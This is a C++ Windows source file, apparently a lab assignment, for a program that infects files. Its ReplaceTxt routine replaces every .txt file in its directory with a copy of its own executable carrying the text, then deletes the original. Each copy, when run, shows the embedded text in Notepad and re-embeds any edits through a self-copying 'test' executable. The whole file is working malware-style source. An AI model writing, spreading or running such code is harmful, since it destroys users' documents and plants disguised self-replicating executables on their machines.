#include "worker.h"

void Notepad::OpenNotepad(std::string path)
{
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    path = "notepad.exe " + path;
    std::wstring wpath(path.begin(), path.end());
    CreateProcess(NULL, const_cast<wchar_t*>(wpath.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    state = 1;
}

void Notepad::WaitNotepade()
{
    WaitForSingleObject(pi.hProcess, INFINITE); // Ждем, пока процесс блокнота не завершится
    CloseHandle(pi.hProcess); // Закрываем дескриптор процесса блокнота
    CloseHandle(pi.hThread); // Закрываем дескриптор потока блокнота
    state = 0;
}


void FileChanged::WatchFileChanges() 
{
    status = 1;
    DWORD dwWaitStatus;
    HANDLE dwChangeHandles;
    TCHAR* ptcFileBaseDir = new TCHAR[strFileBaseDir.size() + 1];
    TCHAR* ptcFileName = new TCHAR[strFileName.size() + 1];

    mbstowcs_s(NULL, ptcFileBaseDir, strFileBaseDir.size() + 1, strFileBaseDir.c_str(), strFileBaseDir.size());
    mbstowcs_s(NULL, ptcFileName, strFileName.size() + 1, strFileName.c_str(), strFileName.size());

    dwChangeHandles = FindFirstChangeNotification(
        ptcFileBaseDir,
        FALSE,
        FILE_NOTIFY_CHANGE_SIZE
    );

    dwWaitStatus = WaitForSingleObject(dwChangeHandles, INFINITE);
    switch (dwWaitStatus)
    {
    case WAIT_OBJECT_0:
        break;

        default:
        break;
    }
    delete[] ptcFileBaseDir;
    delete[] ptcFileName;

    status = 0;
}


void FileWorker::WaitTxt(std::string path_txt, std::string path_exe)
{
    Notepad notepad;
    DirManager dir_manager;
    FileChanged file_changed;
    FileManager file_manager;

    std::string data_from_file;

    notepad.OpenNotepad(path_txt);
    file_manager.CopyExeFile(dir_manager.GetCurrentExePath(), path_exe, "");

    std::thread wait_notepad([&notepad]() {notepad.WaitNotepade(); });

    Sleep(10);
    
    while (notepad.GetState())
    {
        Sleep(100);
    }
    wait_notepad.join();
    data_from_file = file_manager.ReadTxt(path_txt);
    file_manager.PushBackFile(path_exe, data_from_file);
}

void FileWorker::ReplaceTxt()
{
    DirManager dir_manager;
    FileManager file_manager;

    std::vector<std::string> path_vector;

    std::string data_from_txt_file;
    std::string path_curr_exe;

    path_curr_exe = dir_manager.GetCurrentExePath();
    path_vector = dir_manager.GetAllTxtPath();

    for (std::string path_str : path_vector)
    {
        data_from_txt_file = file_manager.ReadTxt(path_str);

        file_manager.CopyExeFile(path_curr_exe, 
                                 dir_manager.FindPath(path_curr_exe) + 
                                 dir_manager.FindFileName(path_str) + 
                                 ".exe",
                                 data_from_txt_file);

        file_manager.RemoveFile(path_str);
    }
}


bool ProgrammWorker::IsDublicate()
{
    DirManager dir_manager;
    FileManager file_manager;

    std::string curr_exe_path = dir_manager.GetCurrentExePath();
    std::string curr_exe_name = dir_manager.FindFileName(curr_exe_path);
    std::string cur_dir_path = dir_manager.FindPath(curr_exe_path);
    std::string original_exe_path = file_manager.ReadTxt("C:\\lab3\\test.txt");
    size_t len_exe_name = curr_exe_name.length();

    if (len_exe_name >= 4)
    {
        std::string last_simv = "";
        for (size_t i = len_exe_name - 1; i > len_exe_name - 5; i--)
        {
            last_simv.push_back(curr_exe_name[i]);
        }
        if (last_simv == "tset")
        {
            std::string data_from_exe = file_manager.ReadDataFromExe(curr_exe_path);
            std::string command_start = original_exe_path;
            file_manager.PushBackFile(original_exe_path, data_from_exe);
            STARTUPINFO si;
            PROCESS_INFORMATION pi;
            ZeroMemory(&si, sizeof(si));
            si.cb = sizeof(si);
            ZeroMemory(&pi, sizeof(pi));
            std::wstring wpath(command_start.begin(), command_start.end());
            CreateProcess(NULL, const_cast<wchar_t*>(wpath.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
            return true;
        }
    }
    return false;
}

bool ProgrammWorker::DeleteDublicate()
{
    std::cout << "DeleteDublicate: START" << std::endl;
    DirManager dir_manager;
    FileManager file_manager;

    std::string curr_exe_path = dir_manager.GetCurrentExePath();
    std::string curr_dir_path = dir_manager.FindPath(curr_exe_path);
    std::string test_name = dir_manager.FindFileName(curr_exe_path) + "test";

    std::vector <std::string> all_exe = dir_manager.GetAllExePath("C:\\lab3");

    for (std::string exe_path : all_exe)
    {
        if (dir_manager.FindFileName(exe_path) == test_name)
        {
            file_manager.RemoveFile(exe_path);
            file_manager.RemoveFile("C:\\lab3\\test.txt");
            std::cout << "DeleteDublicate: TRUE" << std::endl;
            return true;
        }
    }
    std::cout << "DeleteDublicate: FALSE" << std::endl;
    return false;
}

void ProgrammWorker::RunNotepad()
{
    DirManager dir_manager;
    FileWorker file_worker;
    FileManager file_manager;

    std::string curr_exe_path = dir_manager.GetCurrentExePath();
    std::string curr_dir_path = dir_manager.FindPath(curr_exe_path);
    std::string curr_exe_name = dir_manager.FindFileName(curr_exe_path);
    std::string txt_path      = "C:\\lab3\\" + curr_exe_name + ".txt";
    std::string test_exe_path = "C:\\lab3\\" + curr_exe_name + "test.exe";

    std::string text_for_notepad = file_manager.ReadDataFromExe(curr_exe_path);

    file_manager.CreateTxtFile(txt_path, text_for_notepad);

    file_worker.WaitTxt(txt_path, test_exe_path);
    file_manager.RemoveFile(txt_path);
}

void ProgrammWorker::RunTestExe()
{
    DirManager dir_manager;
    FileManager file_manager;

    std::string curr_exe_path = dir_manager.GetCurrentExePath();
    std::string curr_dir_path = dir_manager.FindPath(curr_exe_path);
    std::string curr_exe_name = dir_manager.FindFileName(curr_exe_path);
    std::string command_start = "C:\\lab3\\" + curr_exe_name + "test.exe";

    file_manager.CreateTxtFile("C:\\lab3\\test.txt", curr_exe_path);

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    std::wstring wpath(command_start.begin(), command_start.end());
    CreateProcess(NULL, const_cast<wchar_t*>(wpath.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}


int Worker::Run()
{
    ProgrammWorker programm_worker;
    FileWorker file_worker;
    DirManager dir_manager;
    dir_manager.CreateDirection("C:\\lab3");

    bool is_dublicate = programm_worker.IsDublicate();
    bool delete_dublicate = programm_worker.DeleteDublicate();

    if ( is_dublicate || delete_dublicate)
    {
        return 0;
    }

    std::thread th_replace_txt([&file_worker]() {file_worker.ReplaceTxt(); });

    Sleep(10);
    programm_worker.RunNotepad();

    th_replace_txt.join();

    programm_worker.RunTestExe();
    
    return 0;
};